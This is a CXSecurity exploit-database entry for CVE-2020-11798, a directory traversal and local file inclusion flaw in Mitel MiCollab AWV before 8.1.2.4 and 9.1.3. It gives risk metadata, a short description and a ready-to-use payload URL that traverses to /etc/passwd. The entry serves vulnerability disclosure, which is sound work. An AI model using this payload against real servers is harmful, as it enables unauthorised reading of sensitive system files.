---
title: Mitel MiCollab AWV 8.1.2.4 / 9.1.3 Directory Traversal / LFI
url: https://cxsecurity.com/issue/WLB-2023040030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-07
fetch_date: 2025-10-04T11:29:07.355196
---

# Mitel MiCollab AWV 8.1.2.4 / 9.1.3 Directory Traversal / LFI

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Mitel MiCollab AWV 8.1.2.4 / 9.1.3 Directory Traversal / LFI** **2023.04.06**  Credit:  **[Kahvi-0](https://cxsecurity.com/author/Kahvi-0/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-11798](https://cxsecurity.com/cveshow/CVE-2020-11798/ "Click to see CVE-2020-11798")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")  [CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")**  CVSS Base Score: **5/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **None**  Availability impact: **None** | |

# Exploit Title: Mitel MiCollab AWV 8.1.2.4 and 9.1.3 - Directory Traversal and LFI
# Date: 2022-10-14
# Fix Date: 2020-05
# Exploit Author: Kahvi-0
# Github: https://github.com/Kahvi-0
# Vendor Homepage: https://www.mitel.com/
# Vendor Security Advisory: https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-20-0005
# Version: before 8.1.2.4 and 9.x before 9.1.3
# CVE: CVE-2020-11798
# CVE Reported By: Tri Bui
Description:
A Directory Traversal vulnerability in the web conference component of Mitel MiCollab AWV before 8.1.2.4 and 9.x before 9.1.3 could allow an attacker to access arbitrary files from restricted directories of the server via a crafted URL, due to insufficient access validation. A successful exploit could allow an attacker to access sensitive information from the restricted directories
Payload:
https://[site]/awcuser/cgi-bin/vcs\_access\_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top